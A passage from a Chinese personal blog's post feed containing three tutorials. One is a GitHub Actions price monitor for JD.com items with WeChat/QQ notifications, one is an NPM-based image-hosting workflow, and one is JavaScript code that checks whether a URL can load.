class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span 